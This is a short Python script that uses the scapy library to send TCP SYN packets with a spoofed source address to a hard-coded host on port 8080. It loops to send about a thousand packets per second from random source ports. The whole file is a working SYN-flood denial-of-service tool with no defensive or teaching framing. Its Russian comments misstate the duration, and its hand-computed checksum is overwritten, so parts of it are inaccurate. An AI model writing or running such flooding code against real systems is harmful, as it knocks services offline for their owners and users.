
import time
import socket
import struct
from scapy.all import *

target_ip = "192.168.204.149"
target_port = 8080
source_ip = "127.55.32.111"

def tcp_checksum(ip_header, tcp_header, payload):
    pseudo_header = struct.pack("!4s4sBBH",
                                socket.inet_aton(source_ip),
                                socket.inet_aton(target_ip),
                                0,
                                socket.IPPROTO_TCP,
                                len(tcp_header) + len(payload))
    data = pseudo_header + tcp_header + payload
    if len(data) % 2 == 1:
        data += b'\x00'
    checksum = 0
    for i in range(0, len(data), 2):
        checksum += (data[i] << 8) + data[i+1]
        checksum = (checksum & 0xffff) + (checksum >> 16)
    return ~checksum & 0xffff

def send_syn_packet(src_ip, dst_ip, src_port, dst_port):
    ip_header = IP(src=src_ip, dst=dst_ip)
    tcp_header = TCP(sport=src_port, dport=dst_port, flags="S")

    raw_tcp_header = bytes(tcp_header)
    tcp_header.chksum = tcp_checksum(bytes(ip_header), raw_tcp_header, b'')
    tcp_header = TCP(raw_tcp_header)

    packet = ip_header / tcp_header
    send(packet)

for _ in range(300):  # Отправляем пакеты в течение 60 секунд
    for _ in range(1000):  # Отправляем 1000 пакетов в секунду
        src_port = RandShort()  # Генерируем случайный исходный порт
        send_syn_packet(source_ip, target_ip, src_port, target_port)
        time.sleep(0.001)  # Ожидание 1 миллисекунды (1000 пакетов в секунду)
